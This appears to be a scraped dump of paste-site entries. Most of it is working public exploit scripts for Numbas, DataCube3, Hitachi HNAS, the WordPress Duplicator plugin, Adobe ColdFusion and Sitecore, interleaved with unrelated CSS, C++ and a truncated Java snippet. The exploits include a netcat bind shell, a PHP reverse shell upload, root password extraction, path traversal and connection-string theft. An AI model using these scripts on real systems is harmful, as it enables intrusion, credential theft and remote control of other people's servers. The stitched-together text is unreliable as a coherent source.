4gDqU5UV,Untitled,D3ENNY,CSS,Tuesday 12th of March 2024 07:34:27 AM CDT,"styles.scss
@import 'tailwindcss/base';
@import 'tailwindcss/components';
@import 'tailwindcss/utilities';
@import './assets/style/root.css'


root.css

:root {
    --obsidian: '#0B1215';
    --oil-50:  '#8e7f4f';
    --oil-100: '#7a6743';
    --oil-200: '#63532f';
    --oil-300: '#5c4f2b';
    --oil-400: '#554b27';
    --oil-500: '#4e4723';
    --oil-600: '#47431f';
    --oil-700: '#403f1b';
    --oil-800: '#393b17';
    --oil-900: '#323613';
}

component.scss

section {
    min-height: 100vh;
    height: max-content;
    
    #bottle > div > img{
        filter: drop-shadow(16px 16px 8px);
        border: 4px solid var(--oil-200);
    }
}
"
Nbagy9Eg,Numbas < v7.3 - Remote Code Execution - CVE-2024-27612,FlyFar,Python,Tuesday 12th of March 2024 07:34:00 AM CDT,"# Exploit Title: Numbas < v7.3 - Remote Code Execution
# Google Dork: N/A
# Date: March 7th, 2024
# Exploit Author: Matheus Boschetti
# Vendor Homepage: https://www.numbas.org.uk/
# Software Link: https://github.com/numbas/Numbas
# Version: 7.2 and below
# Tested on: Linux
# CVE: CVE-2024-27612

import sys, requests, re, argparse, subprocess, time
from bs4 import BeautifulSoup

s = requests.session()

def getCSRF(target):
    url = f""http://{target}/""
    req = s.get(url)
    soup = BeautifulSoup(req.text, 'html.parser')
    csrfmiddlewaretoken = soup.find('input', attrs={'name': 'csrfmiddlewaretoken'})['value']
    return csrfmiddlewaretoken

def createTheme(target):
    # Format request
    csrfmiddlewaretoken = getCSRF(target)
    theme = 'ExampleTheme'
    boundary = '----WebKitFormBoundaryKUMXsLP31HzARUV1'
    data = (
        f'--{boundary}\r\n'
        'Content-Disposition: form-data; name=""csrfmiddlewaretoken""\r\n'
        '\r\n'
        f'{csrfmiddlewaretoken}\r\n'
        f'--{boundary}\r\n'
        'Content-Disposition: form-data; name=""name""\r\n'
        '\r\n'
        f'{theme}\r\n'
        f'--{boundary}--\r\n'
    )
    headers = {'Content-Type': f'multipart/form-data; boundary={boundary}',
               'User-Agent': 'Mozilla/5.0',
               'Accept': '*/*',
               'Connection': 'close'}

    # Create theme and return its ID
    req = s.post(f""http://{target}/theme/new/"", headers=headers, data=data)
    redir = req.url
    split = redir.split('/')
    id = split[4]
    print(f""\t[i] Theme created with ID {id}"")
    return id

def login(target, user, passwd):
    print(""\n[i] Attempting to login..."")

    csrfmiddlewaretoken = getCSRF(target)
    data = {'csrfmiddlewaretoken': csrfmiddlewaretoken,
            'username': user,
            'password': passwd,
            'next': '/'}
    
    # Login
    login = s.post(f""http://{target}/login/"", data=data, allow_redirects=True)
    res = login.text
    if(""Logged in as"" not in res):
        print(""\n\n[!] Login failed!"")
        sys.exit(-1)

    # Check if logged and fetch ID
    usermatch = re.search(r'Logged in as <strong>(.*?)</strong>', res)
    if usermatch:
        user = usermatch.group(1)
        idmatch = re.search(r'<a href=""/accounts/profile/(.*?)/""><span class=""glyphicon glyphicon-user"">', res)
        if idmatch:
            id = idmatch.group(1)
            print(f""\t[+] Logged in as \""{user}\"" with ID {id}"")

def checkVuln(url):
    print(""[i] Checking if target is vulnerable..."")

    # Attempt to read files
    themeID = createTheme(url)
    target = f""http://{url}/themes/{themeID}/edit_source?filename=../../../../../../../../../..""
    hname = s.get(f""{target}/etc/hostname"")
    ver = s.get(f""{target}/etc/issue"")
    hnamesoup = BeautifulSoup(hname.text, 'html.parser')
    versoup = BeautifulSoup(ver.text, 'html.parser')
    hostname = hnamesoup.find('textarea').get_text().strip()
    version = versoup.find('textarea').get_text().strip()
    if len(hostname) < 1:
        print(""\n\n[!] Something went wrong - target might not be vulnerable."")
        sys.exit(-1)
    print(f""\n[+] Target \""{hostname}\"" is vulnerable!"")
    print(f""\t[i] Running: \""{version}\"""")

    # Cleanup - delete theme
    print(f""\t\t[i] Cleanup: deleting theme {themeID}..."")
    target = f""http://{url}/themes/{themeID}/delete""
    csrfmiddlewaretoken = getCSRF(url)
    data = {'csrfmiddlewaretoken':csrfmiddlewaretoken}
    s.post(target, data=data)


def replaceInit(target):
    # Overwrite __init__.py with arbitrary code
    rport = '8443'
    payload = f""import subprocess;subprocess.Popen(['nc','-lnvp','{rport}','-e','/bin/bash'])""
    csrfmiddlewaretoken = getCSRF(target)
    filename = '../../../../numbas_editor/numbas/__init__.py'
    themeID = createTheme(target)
    data = {'csrfmiddlewaretoken': csrfmiddlewaretoken,
            'source': payload,
            'filename': filename}

    print(""[i] Delivering payload..."")
    # Retry 5 times in case something goes wrong...
    for attempt in range(5):
        try:
            s.post(f""http://{target}/themes/{themeID}/edit_source"", data=data, timeout=10)
        except Exception as e:
            pass
    
    # Establish connection to bind shell
    time.sleep(2)
    print(f""\t[+] Payload delivered, establishing connection...\n"")
    if "":"" in target:
        split = target.split("":"")
        ip = split[0]
    else:
        ip = str(target)
    subprocess.Popen([""nc"", ""-n"", ip, rport])
    while True:
        pass


def main():
    parser = argparse.ArgumentParser()
    if len(sys.argv) <= 1:
        print(""\n[!] No option provided!"")
        print(""\t- check: Passively check if the target is vulnerable by attempting to read files from disk\n\t- exploit: Attempt to actively exploit the target\n"")
        print(f""[i] Usage: python3 {sys.argv[0]} <option> --target 172.16.1.5:80 --user example --passwd qwerty"")
        sys.exit(-1)

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('action', nargs='?', choices=['check', 'exploit'], help='Action to perform: check or exploit')
    parser.add_argument('--target', help='Target IP:PORT')
    parser.add_argument('--user', help='Username to authenticate')
    parser.add_argument('--passwd', help='Password to authenticate')
    args = parser.parse_args()
    action = args.action
    target = args.target
    user = args.user
    passwd = args.passwd

    print(""\n\t\t-==[ CVE-2024-27612: Numbas Remote Code Execution (RCE) ]==-"")
    
    if action == 'check':
        login(target, user, passwd)
        checkVuln(target)
    elif action == 'exploit':
        login(target, user, passwd)
        replaceInit(target)
    else:
        sys.exit(-1)


if __name__ == ""__main__"":
    main()
            "
X32T9jxN,DataCube3 v1.0 - Unrestricted file upload 'RCE' - CVE-2024-25830 + CVE-2024-25832,FlyFar,Python,Tuesday 12th of March 2024 07:32:45 AM CDT,"# Exploit Title: DataCube3 v1.0 - Unrestricted file upload 'RCE'
# Date: 7/28/2022
# Exploit Author: Samy Younsi - NS Labs (https://neroteam.com)
# Vendor Homepage: https://www.f-logic.jp
# Software Link: https://www.f-logic.jp/pdf/support/manual_product/manual_product_datacube3_ver1.0_sc.pdf
# Version: Ver1.0
# Tested on: DataCube3 version 1.0 (Ubuntu)
# CVE : CVE-2024-25830 + CVE-2024-25832

# Exploit chain reverse shell, information disclosure (root password leak) + unrestricted file upload

from __future__ import print_function, unicode_literals
from bs4 import BeautifulSoup
import argparse
import requests
import json
import urllib3
import re
urllib3.disable_warnings()

def banner():
  dataCube3Logo = """""" 
        ▒▒▒▒▒▒████████████████████████████████████▓▓▓▓▓▓▓▓
      ▒▒▒▒▒▒▒▒██        DataCube3   Ver1.0      █F-logic▓▓
      ▒▒████▒▒██        ████        ████        ██▓▓▓▓▓▓▓▓
      ▒▒████▒▒██        ████        ████        ██▓▓▓▓▓▓▓▓
      ▒▒▒▒▒▒▒▒██        ████        ████        ██▓▓▓▓▓▓▓▓
      ▒▒▒▒▒▒▒▒██                                ██▓▓████▓▓
      ▒▒▒▒▒▒▒▒██        ██             ██       ██▓▓████▓▓
      ▒▒▒▒▒▒▒▒██        █████████████████       ██▓▓▓▓▓▓▓▓
        ▒▒▒▒▒▒████████████████████████████████████▓▓▓▓▓▓                                       
                                                                                 
\033[1;92mSamy Younsi (Necrum Security Labs)\033[1;m         \033[1;91mDataCube3 exploit chain reverse shell\033[1;m                                                 
                FOR EDUCATIONAL PURPOSE ONLY.   
  """"""
  return print('\033[1;94m{}\033[1;m'.format(dataCube3Logo))


def extractRootPwd(RHOST, RPORT, protocol):
  url = '{}://{}:{}/admin/config_all.php'.format(protocol, RHOST, RPORT)
  try:
    response = requests.get(url, allow_redirects=False, verify=False, timeout=20)
    if response.status_code != 302:
      print('[!] \033[1;91mError: DataCube3 web interface is not reachable. Make sure the specified IP is correct.\033[1;m')
      exit()
    soup = BeautifulSoup(response.content.decode('utf-8'), 'html.parser')
    scriptTag = str(soup.find_all('script')[12]).replace(' ', '')
    rawLeakedData = re.findall('configData:.*,', scriptTag)[0]
    jsonLeakedData = json.loads('[{}]'.format(rawLeakedData.split('configData:[')[1].split('],')[0]))
    adminPassword = jsonLeakedData[12]['value']
    rootPassword = jsonLeakedData[14]['value']
    print('[INFO] DataCube3 leaked credentials successfully extracted: admin:{} | root:{}.\n[INFO] The target must be vulnerable.'.format(adminPassword, rootPassword))
    return rootPassword
  except:
    print('[ERROR] Can\'t grab the DataCube3 version...')


def generateAuthCookie(RHOST, RPORT, protocol, rootPassword):
  print('[INFO] Generating DataCube3 auth cookie ...')
  url = '{}://{}:{}/admin/config_all.php'.format(protocol, RHOST, RPORT)
  data = {
    'user_id': 'root',
    'user_pw': rootPassword,
    'login': '%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3'
  }
  try:
    response = requests.post(url, data=data, allow_redirects=False, verify=False, timeout=20)
    if response.status_code != 302:
      print('[!] \033[1;91mError: An error occur while trying to get the auth cookie, is the root password correct?\033[1;m')
      exit()
    authCookie = response.cookies.get_dict() 
    print('[INFO] Authentication successful! Auth Cookie: {}'.format(authCookie))  
    return authCookie
  except:
    print('[ERROR] Can\'t grab the auth cookie, is the root password correct?')


def extractAccesstime(RHOST, RPORT, LHOST, LPORT, protocol, authCookie):
  print('[INFO] Extracting Accesstime ...')
  url = '{}://{}:{}/admin/setting_photo.php'.format(protocol, RHOST, RPORT)
  try:
    response = requests.get(url, cookies=authCookie, allow_redirects=False, verify=False, timeout=20)
    if response.status_code != 302:
      print('[!] \033[1;91mError: An error occur while trying to get the accesstime value.\033[1;m')
      exit()
    soup = BeautifulSoup(response.content.decode('utf-8'), 'html.parser')
    accessTime = soup.find('input', {'name': 'accesstime'}).get('value')
    print('[INFO] AccessTime value: {}'.format(accessTime))
    return accessTime
  except:
    print('[ERROR] Can\'t grab the accesstime value, is the root password correct?')


def injectReverseShell(RHOST, RPORT, LHOST, LPORT, protocol, authCookie, accessTime):
  print('[INFO] Injecting PHP reverse shell script ...')
  filename='rvs.php'
  payload = '<?php $sock=fsockopen(""{}"",{});$proc=proc_open(""sh"", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);?>'.format(LHOST, LPORT)

  data = '-----------------------------113389720123090127612523184396\r\nContent-Disposition: form-data; name=""add""\r\n\r\nå��ç��è¿½å�\xA0\r\n-----------------------------113389720123090127612523184396\r\nContent-Disposition: form-data; name=""addPhoto""; filename=""{}""\r\nContent-Type: image/jpeg\r\n\r\n{}\r\n-----------------------------113389720123090127612523184396\r\nContent-Disposition: form-data; name=""accesstime""\r\n\r\n{}\r\n-----------------------------113389720123090127612523184396--\r\n'.format(filename, payload, accessTime)

  headers = {
      'Content-Type': 'multipart/form-data; boundary=---------------------------113389720123090127612523184396'
  }
  url = '{}://{}:{}/admin/setting_photo.php'.format(protocol, RHOST, RPORT)
  try:
    response = requests.post(url, cookies=authCookie, headers=headers, data=data, allow_redirects=False, verify=False, timeout=20)
    if response.status_code != 302:
        print('[!] \033[1;91mError: An error occur while trying to upload the PHP reverse shell script.\033[1;m')
        exit()
    shellURL = '{}://{}:{}/images/slideshow/{}'.format(protocol, RHOST, RPORT, filename)
    print('[INFO] PHP reverse shell script successfully uploaded!\n[INFO] SHELL URL: {}'.format(shellURL))
    return shellURL
  except:
    print('[ERROR] Can\'t upload the PHP reverse shell script, is the root password correct?')


def execReverseShell(shellURL):
  print('[INFO] Executing reverse shell...')
  try:
    response = requests.get(shellURL, allow_redirects=False, verify=False)
    print('[INFO] Reverse shell successfully executed.')
    return
  except Exception as e:
      print('[ERROR] Reverse shell failed. Make sure the DataCube3 device can reach the host {}:{}')
      return False


def main():
  banner()
  args = parser.parse_args()
  protocol = 'https' if args.RPORT == 443 else 'http'
  rootPassword = extractRootPwd(args.RHOST, args.RPORT, protocol)
  authCookie = generateAuthCookie(args.RHOST, args.RPORT, protocol, rootPassword)
  accessTime = extractAccesstime(args.RHOST, args.RPORT, args.LHOST, args.LPORT, protocol, authCookie)
  shellURL = injectReverseShell(args.RHOST, args.RPORT, args.LHOST, args.LPORT, protocol, authCookie, accessTime)
  execReverseShell(shellURL)


if __name__ == '__main__':
  parser = argparse.ArgumentParser(description='Script PoC that exploit an unauthenticated remote command injection on f-logic DataCube3 devices.', add_help=False)
  parser.add_argument('--RHOST', help='Refers to the IP of the target machine. (f-logic DataCube3 device)', type=str, required=True)
  parser.add_argument('--RPORT', help='Refers to the open port of the target machine. (443 by default)', type=int, required=True)
  parser.add_argument('--LHOST', help='Refers to the IP of your machine.', type=str, required=True)
  parser.add_argument('--LPORT', help='Refers to the open port of your machine.', type=int, required=True)
  main()
            "
mCBirecn,Hitachi NAS (HNAS) System Management Unit (SMU) Backup & Restore < 14.8.7825.01 - IDOR,FlyFar,Python,Tuesday 12th of March 2024 07:30:56 AM CDT,"#!/usr/bin/python3
#
# Title:            Hitachi NAS (HNAS) System Management Unit (SMU) Backup & Restore IDOR Vulnerability 
# CVE:              CVE-2023-5808
# Date:             2023-12-13
# Exploit Author:   Arslan Masood (@arszilla)
# Vendor:           https://www.hitachivantara.com/
# Version:          < 14.8.7825.01
# Tested On:        13.9.7021.04        

import argparse
from datetime import datetime
from os import getcwd

import requests

parser = argparse.ArgumentParser(
    description=""CVE-2023-5808 PoC"",
    usage=""./CVE-2023-5808.py --host <Hostname/FQDN/IP> --id <JSESSIONID> --sso <JSESSIONIDSSO>""
    )

# Create --host argument:
parser.add_argument(
    ""--host"",
    required=True,
    type=str,
    help=""Hostname/FQDN/IP Address. Provide the port, if necessary, i.e. 127.0.0.1:8443, example.com:8443""
    )

# Create --id argument:
parser.add_argument(
    ""--id"",
    required=True,
    type=str,
    help=""JSESSIONID cookie value""
    )

# Create --sso argument:
parser.add_argument(
    ""--sso"",
    required=True,
    type=str,
    help=""JSESSIONIDSSO cookie value""
    )

args = parser.parse_args()

def download_file(hostname, jsessionid, jsessionidsso):
    # Set the filename:
    filename = f""smu_backup-{datetime.now().strftime('%Y-%m-%d_%H%M')}.zip""

    # Vulnerable SMU URL:
    smu_url = f""https://{hostname}/mgr/app/template/simple%2CBackupSmuScreen.vm/password/""

    # GET request cookies
    smu_cookies = {
        ""JSESSIONID"":       jsessionid,
        ""JSESSIONIDSSO"":    jsessionidsso
        }

    # GET request headers:
    smu_headers = {
        ""User-Agent"":                   ""Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"",
        ""Accept"":                       ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"",
        ""Accept-Language"":              ""en-US,en;q=0.5"",
        ""Accept-Encoding"":              ""gzip, deflate"",
        ""Dnt"":                          ""1"",
        ""Referer"":                      f""https://{hostname}/mgr/app/action/admin.SmuBackupRestoreAction/eventsubmit_doperform/ignored"",
        ""Upgrade-Insecure-Requests"":    ""1"",
        ""Sec-Fetch-Dest"":               ""document"",
        ""Sec-Fetch-Mode"":               ""navigate"",
        ""Sec-Fetch-Site"":               ""same-origin"",
        ""Sec-Fetch-User"":               ""?1"",
        ""Te"":                           ""trailers"",
        ""Connection"":                   ""close""
        }

    # Send the request:
    with requests.get(smu_url, headers=smu_headers, cookies=smu_cookies, stream=True, verify=False) as file_download:
        with open(filename, 'wb') as backup_archive:
            # Write the zip file to the CWD:
            backup_archive.write(file_download.content)

    print(f""{filename} has been downloaded to {getcwd()}"")

if __name__ == ""__main__"":
    download_file(args.host, args.id, args.sso)
            "
jcLdAyTH,WordPress Plugin Duplicator < 1.5.7.1 - Unauthenticated Sensitive Data Exposure to Account Takeover,FlyFar,Python,Tuesday 12th of March 2024 07:29:13 AM CDT,"# Exploit Title: WordPress Plugin Duplicator < 1.5.7.1 -
Unauthenticated Sensitive Data Exposure to Account Takeover
# Google Dork: inurl:(""plugins/duplicator/"")
# Date: 2023-12-04
# Exploit Author: Dmitrii Ignatyev
# Vendor Homepage: https://duplicator.com/?utm_source=duplicator_free&utm_medium=wp_org&utm_content=desc_details&utm_campaign=duplicator_free
# Software Link: https://wordpress.org/plugins/duplicator/
# Version: 1.5.7.1
# Tested on: WordPress 6.4
# CVE : CVE-2023-6114# CVE-Link:https://wpscan.com/vulnerability/5c5d41b9-1463-4a9b-862f-e9ee600ef8e1/

# CVE-Link: https://research.cleantalk.org/cve-2023-6114-duplicator-poc-exploit/A
severe vulnerability has been discovered in the directory
*/wordpress/wp-content/backups-dup-lite/tmp/*. This flaw not only
exposes extensive information about the site, including its
configuration, directories, and files, but more critically, it
provides unauthorized access to sensitive data within the database and
all data inside. Exploiting this vulnerability poses an imminent
threat, leading to potential *brute force attacks on password hashes
and, subsequently, the compromise of the entire system*.*
POC*:

1) It is necessary that either the administrator or auto-backup works
automatically at the scheduled time

2) Exploit will send file search requests every 5 seconds

3) I attack the site with this vulnerability using an exploit

Exploit sends a request to the server every 5 seconds along the path
“*http://your_site/wordpress/wp-content/backups-dup-lite/tmp/
<http://your_site/wordpress/wp-content/backups-dup-lite/tmp/>”* and if
it finds something in the index of, it instantly parses all the data
and displays it on the screen

Exploit (python3):

import requests
from bs4 import BeautifulSoup
import re
import time

url = ""http://127.0.0.1/wordpress/wp-content/backups-dup-lite/tmp/""
processed_files = set()

def get_file_names(url):
    response = requests.get(url)

    if response.status_code == 200 and len(response.text) > 0:
        soup = BeautifulSoup(response.text, 'html.parser')
        links = soup.find_all('a')

        file_names = []
        for link in links:
            file_name = link.get('href')
            if file_name != ""../"" and not file_name.startswith(""?""):
                file_names.append(file_name)

        return file_names
    return []

def get_file_content(url, file_name):
    file_url = url + file_name


    if re.search(r'\.zip(?:\.|$)', file_name, re.IGNORECASE):
        print(f""Ignoring file: {file_name}"")
        return None

    file_response = requests.get(file_url)

    if file_response.status_code == 200:
        return file_response.text
    return None

while True:
    file_names = get_file_names(url)

    if file_names:
        print(""File names on the page:"")
        for file_name in file_names:
            if file_name not in processed_files:
                print(file_name)
                file_content = get_file_content(url, file_name)

                if file_content is not None:
                    print(""File content:"")
                    print(file_content)
                    processed_files.add(file_name)

    time.sleep(5)



-- 
With best regards,
Dmitrii Ignatyev, Penetration Tester
            "
FC9VDEq0,"Adobe ColdFusion versions 2018,15 and 2021,5 and earlier - Arbitrary File Read - CVE-2023-26360",FlyFar,Python,Tuesday 12th of March 2024 07:26:52 AM CDT,"# Exploit Title: File Read Arbitrary Exploit for CVE-2023-26360
# Google Dork: [not]
# Date: [12/28/2023]
# Exploit Author: [Youssef Muhammad]
# Vendor Homepage: [
https://helpx.adobe.com/coldfusion/kb/coldfusion-downloads.html]
# Software Link: [
https://drive.google.com/drive/folders/17ryBnFhswxiE1sHrNByxMVPKfUnwqmp0]
# Version: [Adobe ColdFusion versions 2018,15 (and earlier) and 2021,5 and
earlier]
# Tested on: [Windows, Linux]
# CVE : [CVE-2023-26360]

import sys
import requests
import json

BANNER = """"""
   ██████ ██    ██ ███████       ██████   ██████  ██████  ██████        ██████   ██████  ██████   ██████   ██████  
  ██      ██    ██ ██                 ██ ██  ████      ██      ██            ██ ██            ██ ██       ██  ████ 
  ██      ██    ██ █████   █████  █████  ██ ██ ██  █████   █████  █████  █████  ███████   █████  ███████  ██ ██ ██ 
  ██       ██  ██  ██            ██      ████  ██ ██           ██       ██      ██    ██      ██ ██    ██ ████  ██ 
   ██████   ████   ███████       ███████  ██████  ███████ ██████        ███████  ██████  ██████   ██████   ██████                                                                                                                                                                                                                                       
""""""

RED_COLOR = ""\033[91m""
GREEN_COLOR = ""\032[42m""
RESET_COLOR = ""\033[0m""

def print_banner():
    print(RED_COLOR + BANNER + ""                  Developed by SecureLayer7"" + RESET_COLOR)
    return 0

def run_exploit(host, target_file, endpoint=""/CFIDE/wizards/common/utils.cfc"", proxy_url=None):
    if not endpoint.endswith('.cfc'):
        endpoint += '.cfc'

    if target_file.endswith('.cfc'):
        raise ValueError('The TARGET_FILE must not point to a .cfc')

    targeted_file = f""a/{target_file}""
    json_variables = json.dumps({""_metadata"": {""classname"": targeted_file}, ""_variables"": []})

    vars_get = {'method': 'test', '_cfclient': 'true'}
    uri = f'{host}{endpoint}'

    response = requests.post(uri, params=vars_get, data={'_variables': json_variables}, proxies={'http': proxy_url, 'https': proxy_url} if proxy_url else None)

    file_data = None
    splatter = '<!-- "" ---></TD></TD></TD></TH></TH></TH>'

    if response.status_code in [404, 500] and splatter in response.text:
        file_data = response.text.split(splatter, 1)[0]

    if file_data is None:
        raise ValueError('Failed to read the file. Ensure the CFC_ENDPOINT, CFC_METHOD, and CFC_METHOD_PARAMETERS are set correctly, and that the endpoint is accessible.')

    print(file_data)

    # Save the output to a file
    output_file_name = 'output.txt'
    with open(output_file_name, 'w') as output_file:
        output_file.write(file_data)
        print(f""The output saved to {output_file_name}"")

if __name__ == ""__main__"":
    if not 3 <= len(sys.argv) <= 5:
        print(""Usage: python3 script.py <host> <target_file> [endpoint] [proxy_url]"")
        sys.exit(1)

    print_banner()

    host = sys.argv[1]
    target_file = sys.argv[2]
    endpoint = sys.argv[3] if len(sys.argv) > 3 else ""/CFIDE/wizards/common/utils.cfc""
    proxy_url = sys.argv[4] if len(sys.argv) > 4 else None

    try:
        run_exploit(host, target_file, endpoint, proxy_url)
    except Exception as e:
        print(f""Error: {e}"")
            "
CMzTmj5u,Sitecore - Remote Code Execution v8.2 - CVE-2023-35813,FlyFar,Python,Tuesday 12th of March 2024 07:24:23 AM CDT,"#!/usr/bin/env python3
#
# Exploit Title: Sitecore - Remote Code Execution v8.2 
# Exploit Author: abhishek morla
# Google Dork: N/A
# Date: 2024-01-08
# Vendor Homepage: https://www.sitecore.com/
# Software Link: https://dev.sitecore.net/
# Version: 10.3
# Tested on: windows64bit / mozila firefox 
# CVE : CVE-2023-35813
# The vulnerability impacts all Experience Platform topologies (XM, XP, XC) from 9.0 Initial Release to 10.3 Initial Release; 8.2 is also impacted
# Blog : https://medium.com/@abhishekmorla/uncovering-cve-2023-35813-retrieving-core-connection-strings-in-sitecore-5502148fce09
# Video POC : https://youtu.be/vWKl9wgdTB0

import argparse
import requests
from urllib.parse import quote
from rich.console import Console

console = Console()
def initial_test(hostname):
    # Initial payload to test vulnerability
    test_payload = '''
    <%@Register
        TagPrefix = 'x'
        Namespace = 'System.Runtime.Remoting.Services'
        Assembly = 'System.Runtime.Remoting, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
    %>
    <x:RemotingService runat='server'
    Context-Response-ContentType='TestVulnerability'
    />
    '''
    encoded_payload = quote(test_payload)

    url = f""https://{hostname}/sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index""
    headers = {""Content-Type"": ""application/x-www-form-urlencoded""}
    data = ""__ISEVENT=1&__SOURCE=&__PARAMETERS=ParseControl(\""{}\"")"".format(encoded_payload)

    response = requests.post(url, headers=headers, data=data, verify=False)

    # Check for the test string in the Content-Type of the response
    return 'TestVulnerability' in response.headers.get('Content-Type', '')

def get_payload(choice):
    # Payload templates for different options
    payloads = {
        '1': ""<%$ ConnectionStrings:core %>"",
        '2': ""<%$ ConnectionStrings:master %>"",
        '3': ""<%$ ConnectionStrings:web %>""
    }

    base_payload = '''
    <%@Register
        TagPrefix = 'x'
        Namespace = 'System.Runtime.Remoting.Services'
        Assembly = 'System.Runtime.Remoting, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
    %>
    <x:RemotingService runat='server'
    Context-Response-ContentType='{}'
    />
    '''

    return base_payload.format(payloads.get(choice, ""Invalid""))

def main(hostname):
    if initial_test(hostname):
        print(""Exploiting, Please wait..."")
        console.print(""[bold green]The target appears to be vulnerable. Proceed with payload selection.[/bold green]"")
        print(""Select the payload to use:"")
        print(""1: Core connection strings"")
        print(""2: Master connection strings"")
        print(""3: Web connection strings"")
        payload_choice = input(""Enter your choice (1, 2, or 3): "")

        payload = get_payload(payload_choice)
        encoded_payload = quote(payload)

        url = f""http://{hostname}/sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index""
        headers = {""Content-Type"": ""application/x-www-form-urlencoded""}
        data = ""__ISEVENT=1&__SOURCE=&__PARAMETERS=ParseControl(\""{}\"")"".format(encoded_payload)

        response = requests.post(url, headers=headers, data=data)

        if 'Content-Type' in response.headers:
            print(""Content-Type from the response header:"")
            print(""\n"")
            print(response.headers['Content-Type'])
        else:
            print(""No Content-Type in the response header. Status Code:"", response.status_code)
    else:
        print(""The target does not appear to be vulnerable to CVE-2023-35813."")


if __name__ == ""__main__"":
    console.print(""[bold green]Author: Abhishek Morla[/bold green]"")
    console.print(""[bold red]CVE-2023-35813[/bold red]"")
    parser = argparse.ArgumentParser(description='Test for CVE-2023-35813 vulnerability in Sitecore')
    parser.add_argument('hostname', type=str, help='Hostname of the target Sitecore instance')
    args = parser.parse_args()

    main(args.hostname)
            "
vgGiaanf,Untitled,35657,C++,Tuesday 12th of March 2024 07:20:25 AM CDT,"#include <iostream>


using namespace std;

class Vector {

public:
	Vector() : size_(0), capacity_(4), arr_(new int[4]) {}

	explicit Vector(const int vector_capacity) : size_(0), capacity_(vector_capacity), arr_(new int[vector_capacity]) {}

	Vector(const Vector& other) : size_(other.size_), capacity_(other.capacity_), arr_(new int[capacity_]) {
		for (int i = 0; i < size_; i++) {
			arr_[i] = other.arr_[i];
		}
		total_number_elements_ += size_;
	} // конструктор копирования

	Vector& operator=(const Vector& other) {
		if (&other != this) { // проверка на самоприсваивание
			total_number_elements_ += other.size_ - size_; // общее количество увеличивается (уменьшается) на разность элементов
			size_ = other.size_;
			capacity_ = other.capacity_;
			delete[] arr_;
			arr_ = new int[capacity_];
			for (int i = 0; i < size_; i++) {
				arr_[i] = other.arr_[i];
			}
		}
		return *this;
	} // копирующий оператор присваивания =
	
	Vector(Vector&& other) : size_(other.size_), capacity_(other.capacity_), arr_(other.arr_) {
		other.arr_ = nullptr;
		other.size_ = 0;
		other.capacity_ = 0;
	} // конструктор перемещения

	Vector& operator=(Vector&& other) {
		if (&other != this) {
			total_number_elements_ += other.size_ - size_; // общее количество увеличивается (уменьшается) на разность элементов
			size_ = other.size_;
			capacity_ = other.capacity_;
			delete[] arr_;
			arr_ = other.arr_;
			other.arr_ = nullptr;
			other.size_ = 0;
			other.capacity_ = 0;
		}
		return *this;
	} // перемещающий оператор присваивания =

	void push_back(const int value) {
		check_capacity();
		arr_[size_] = value;
		size_++;
		total_number_elements_++;
	}

	void pop_back() {
		if (size_ > 0) {
			size_--;
		}
		total_number_elements_--;
	}

	void insert(const int index, const int value) {
		if (index < 0 || index > size_) {
			cout << ""Некорректный индекс"" << endl;
			return;
		}
		check_capacity();
		for (int i = size_; i > index; i--) {
			arr_[i] = arr_[i - 1];
		}
		arr_[index] = value;
		size_++;
		total_number_elements_++;
	}

	void erase(const int index) {
		if (index < 0 || index >= size_) {
			cout << ""Некорректный индекс"" << endl;
			return;
		}
		for (int i = index; i < size_ - 1; i++) {
			arr_[i] = arr_[i + 1];
		}
		size_--;
		total_number_elements_--;
	}

	int& operator[](const int index) {
		if (index < 0 || index >= size_) {
			cout << ""Некорректный индекс"" << endl;
		}
		return arr_[index];
	}

	int operator[](const int index) const {
		if (index < 0 || index >= size_) {
			cout << ""Некорректный индекс"" << endl;
		}
		return arr_[index];
	}

	int size() const {
		return size_;
	}

	int capacity() const {
		return capacity_;
	}

	bool operator==(const Vector& right) const {
		if (right.size_ != size_) {
			return false;
		}
		for (int i = 0; i < size_; i++) {
			if (arr_[i] != right.arr_[i])
				return false;
		}
		return true;
	}

	bool operator!=(const Vector& right) const {
		return !(*this == right);
	}

	void print() const {
		for (int i = 0; i < size_; i++) {
			cout << arr_[i] << "" "";
		}
		cout << endl;
	}

	static int get_total_number_elements() {
		return total_number_elements_;
	}


	~Vector() {
		delete[] arr_;
		total_number_elements_ -= size_;
	}

private:

	void check_capacity() {
		if (size_ == capacity_) {
			int* temp = new int[capacity_ * 2];
			for (int i = 0; i < size_; i++) {
				temp[i] = arr_[i];
			}
			delete[] arr_;
			arr_ = temp;
			capacity_ *= 2;
		}
	}

	int size_; // текущее количество элементов
	int capacity_; // емкость хранилища
	int* arr_; // хранилище
	static int total_number_elements_; // общее количество элементов по всем векторам
};


int Vector::total_number_elements_ = 0;


int main() {
	setlocale(LC_ALL, ""ru"");

	Vector vec1;

	vec1.push_back(10);
	vec1.push_back(15);
	vec1.push_back(20);
	vec1.push_back(25);
	vec1.push_back(22);

	vec1.print();

	vec1.pop_back();
	vec1.print();

	vec1.insert(2, 44);
	vec1.print();

	vec1.erase(2);
	vec1.print();

	vec1[0] =  33;
	cout << vec1[3] << endl;

	vec1.print();

	cout << vec1.size() << endl;
	cout << vec1.capacity() << endl;

	cout << Vector::get_total_number_elements() << endl;

	const Vector vec2(vec1);

	vec2.print();

	cout << vec2.size() << endl;
	cout << vec2.capacity() << endl;

	Vector vec3;
	vec3 = vec1;

	cout << Vector::get_total_number_elements() << endl;

	cout << (vec1 == vec2) << endl;
	cout << (vec1 != vec2) << endl;
}
"
4vZ7sqNU,Untitled,mantha_raghava,Java,Tuesday 12th of March 2024 07:18:50 AM CDT,"import java.io.*;
import java.util.*;

public class Main {

    static int[] nearestSmallerOnLeft(int[] a, int n) {
        int[] left = new int[n];
        Stack<Integer> stack = new Stack<>();

        for (int i = 0; i < n; i++) {
            while (!stack.isEmpty() && a[i] <= a[stack.peek()]) {
                stack.pop();
            }
            left[i] = stack.isEmpty() ? -1 : stack.peek();
            stack.push(i);
